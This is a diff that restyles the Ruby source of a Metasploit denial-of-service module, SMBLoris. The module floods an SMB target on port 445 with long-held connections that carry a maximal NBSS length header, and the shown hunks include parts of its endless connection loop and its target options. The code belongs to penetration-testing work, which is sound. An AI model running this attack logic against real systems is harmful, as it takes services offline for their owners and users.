@@ -14,7 +14,7 @@ end
 
 metadata = {
   name: 'SMBLoris NBSS Denial of Service',
-  description: %q{
+  description: "
     The SMBLoris attack consumes large chunks of memory in the target by sending
     SMB requests with the NetBios Session Service(NBSS) Length Header value set
     to the maximum possible value. By keeping these connections open and initiating
@@ -25,10 +25,10 @@ metadata = {
     DISCALIMER: This module opens a lot of simultaneous connections. Please check
     your system's ULIMIT to make sure it can handle it. This module will also run
     continuously until stopped.
-  },
+  ",
   authors: [
-      'thelightcosine',
-      'Adam Cammack <adam_cammack[at]rapid7.com>'
+    'thelightcosine',
+    'Adam Cammack <adam_cammack[at]rapid7.com>'
   ],
   date: '2017-06-29',
   references: [
@@ -36,8 +36,8 @@ metadata = {
   ],
   type: 'dos',
   options: {
-    rhost: {type: 'address', description: 'The target address', required: true, default: nil},
-    rport: {type: 'port', description: 'SMB port on the target', required: true, default: 445},
+    rhost: { type: 'address', description: 'The target address', required: true, default: nil },
+    rport: { type: 'port', description: 'SMB port on the target', required: true, default: 445 }
   }
 }
 
@@ -54,11 +54,9 @@ def run(args)
 
   Metasploit.logging_prefix = "#{target.inspect_sockaddr} - "
 
-  while true do
+  loop do
     begin
-      sockets.delete_if do |s|
-        s.closed?
-      end
+      sockets.delete_if(&:closed?)
 
       nsock = target.connect(timeout: 360)
       nsock.setsockopt(Socket::SOL_SOCKET, Socket::SO_KEEPALIVE, true)
@@ -69,7 +67,7 @@ def run(args)
       sockets << nsock
 
       n_loops += 1
-      if  last_reported != sockets.length
+      if last_reported != sockets.length
         if n_loops % 100 == 0
           last_reported = sockets.length
           Metasploit.log "#{sockets.length} socket(s) open", level: 'info'
@@ -90,6 +88,6 @@ def run(args)
   end
 end
 
-if __FILE__ == $PROGRAM_NAME
+if $PROGRAM_NAME == __FILE__
   Metasploit.run(metadata, method(:run))
 end
